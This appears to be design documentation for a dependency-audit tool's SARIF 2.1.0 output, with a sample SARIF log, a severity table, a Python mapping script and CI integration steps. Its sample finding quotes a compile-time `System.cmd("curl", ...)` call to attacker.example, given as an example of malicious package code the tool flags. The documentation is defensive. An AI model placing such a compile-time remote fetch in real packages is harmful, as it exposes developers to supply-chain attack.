# SARIF output — `--sarif <path>`

Phase 2 adds SARIF 2.1.0 emission so audit findings can flow into the
same UIs developers already use for SAST: VS Code's `sarif-viewer`,
GitHub's Code Scanning alerts, and JetBrains' Qodana surfaces.

## Iron Laws

1. **SARIF is additive, NOT replacement.** Markdown table on stdout
   stays the default. `--sarif <path>` writes SARIF alongside; it
   does not silence the other outputs.
2. **No hard tabs in any emitted YAML/JSON example.** SARIF JSON
   uses 2-space indent. Examples in this doc and docs/ use 2-space
   indent too — never tabs (markdown lint MD010).
3. **Schema-validate every run.** Smoke must include a SARIF
   round-trip: `--sarif /tmp/out.sarif` → validate against
   schemastore SARIF 2.1.0 schema → re-load. Catches mapping bugs
   that ad-hoc users won't catch.
4. **Stable `ruleId`.** Use `phx-deps-audit/rule-<N>` (e.g.
   `phx-deps-audit/rule-3`). Don't change the prefix across versions
   — GitHub Code Scanning de-duplicates by `ruleId` over PR history.

## SARIF 2.1.0 contract

A SARIF log is a JSON document with one or more `runs`. We emit a
single run per audit:

```json
{
  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "phx-deps-audit",
          "version": "2.10.0",
          "informationUri": "https://github.com/oliver-kriska/claude-elixir-phoenix",
          "rules": [
            {
              "id": "phx-deps-audit/rule-1",
              "name": "BidiUnicodeControlChar",
              "shortDescription": {"text": "Bidi Unicode control char in source"},
              "fullDescription": {"text": "Detects directional-override Unicode control characters in source files (Trojan Source CVE-2021-42574)."},
              "helpUri": "https://github.com/oliver-kriska/claude-elixir-phoenix/blob/main/plugins/elixir-phoenix/skills/deps-audit/references/heuristics.md#rule-1",
              "defaultConfiguration": {"level": "error"}
            }
          ]
        }
      },
      "results": [
        {
          "ruleId": "phx-deps-audit/rule-3",
          "level": "error",
          "message": {
            "text": "System.cmd at compile time in lib/init.ex:14 — package phoenix_extras 0.2.0"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {"uri": "lib/init.ex"},
                "region": {"startLine": 14, "snippet": {"text": "System.cmd(\"curl\", [\"-fsSL\", \"https://attacker.example\"])"}}
              },
              "logicalLocations": [
                {"name": "phoenix_extras", "kind": "package"},
                {"name": "0.2.0", "kind": "version"}
              ]
            }
          ],
          "properties": {
            "package": "phoenix_extras",
            "version": "0.2.0",
            "previous_version": "0.1.0",
            "differential": "new"
          }
        }
      ]
    }
  ]
}
```

### Severity mapping

| Phase 1 severity | SARIF `level` | SARIF `kind` |
|------------------|---------------|--------------|
| block | error | fail |
| warn | warning | fail |
| info | note | informational |

SARIF distinguishes `level` (severity) from `kind` (true/false
positive). We emit `kind: "fail"` for block/warn and
`kind: "informational"` for INFO — matching how Code Scanning UIs
group results.

## Mapping logic

```python
# scripts/findings_to_sarif.py — outline
import json
import sys
from pathlib import Path

LEVELS = {"block": "error", "warn": "warning", "info": "note"}

def finding_to_result(f, package, version, previous_version):
    loc = {
        "physicalLocation": {
            "artifactLocation": {"uri": f.get("file") or "mix.exs"},
            "region": {"startLine": f.get("line") or 1}
        }
    }
    if f.get("snippet"):
        loc["physicalLocation"]["region"]["snippet"] = {"text": f["snippet"]}
    loc["logicalLocations"] = [
        {"name": package, "kind": "package"},
        {"name": version, "kind": "version"},
    ]
    return {
        "ruleId": f"phx-deps-audit/rule-{f['rule_id']}",
        "level": LEVELS.get(f.get("severity", "warn"), "warning"),
        "message": {"text": f.get("message", "")},
        "locations": [loc],
        "properties": {
            "package": package,
            "version": version,
            "previous_version": previous_version,
            "differential": f.get("differential", "new"),
        },
    }
```

The skill body invokes this script over `new_signals.jsonl` (or
`findings.jsonl` when `--no-differential`).

## Schema validation

Smoke target (post-Phase 2):

```bash
python3 -m jsonschema -i out.sarif \
  https://json.schemastore.org/sarif-2.1.0.json
```

`pip install jsonschema` is a build-time dep, NOT a runtime dep —
production audits don't validate (overhead). Validation runs in CI
only.

## VS Code sarif-viewer

```text
1. Install: `code --install-extension MS-SarifVSCode.sarif-viewer`
2. Run audit: `/phx:deps-audit --sarif .claude/audit.sarif`
3. In VS Code, open `.claude/audit.sarif` — the SARIF panel auto-opens
   and lets you jump to file:line for each result.
```

## GitHub upload-sarif action

For projects that want CI gating, add a workflow step:

```yaml
- name: Run deps-audit
  run: |
    claude code -m "/phx:deps-audit --sarif audit.sarif"
- name: Upload SARIF to Code Scanning
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: audit.sarif
    category: phx-deps-audit
```

Note the 2-space indent (NOT tabs) — MD010 lint and the YAML parser
both reject hard tabs. The `category` field separates phx-deps-audit
results from other Code Scanning sources in the GitHub UI.

## Limitations

- **No fix suggestions.** SARIF supports `fixes[]`, but deps-audit
  doesn't propose patches (it's a deps-level tool, not a code
  rewriter). Field omitted.
- **No code flows.** Could compute `codeFlows[]` for Rule 3
  (`__before_compile__` → `System.cmd`) but adds parser complexity
  for little reviewer-side value. Deferred.
- **Single tool.** Each audit emits one SARIF run with one driver.
  Multi-tool SARIF (Semgrep + YARA + native rules in one file)
  is a Phase 3 enhancement when those layers are stable.
